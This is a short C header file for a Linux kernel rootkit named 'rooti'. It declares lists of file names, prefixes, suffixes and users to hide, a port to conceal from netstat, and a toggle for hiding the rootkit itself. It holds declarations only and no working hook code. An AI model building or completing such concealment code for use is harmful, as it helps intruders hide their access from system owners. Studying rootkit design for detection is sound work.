#ifndef _ROOTI_CONFIG_H
#define _ROOTI_CONFIG_H

#include <linux/types.h> 

// Names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES[];
extern const size_t ROOTI_HIDDEN_FILES_COUNT;

// Prefixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_PREFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT;

// Suffixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_SUFFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT;

// Names of users that should be hidden
extern const char *ROOTI_HIDDEN_USERS[];
extern const size_t ROOTI_HIDDEN_USERS_COUNT;

// Port number to hide from tools like netstat
#define ROOTI_HIDE_PORT 8080

// Indicates whether this rootkit should be hidden by default
// #define ROOTI_HIDEME_DEFAULT

#endif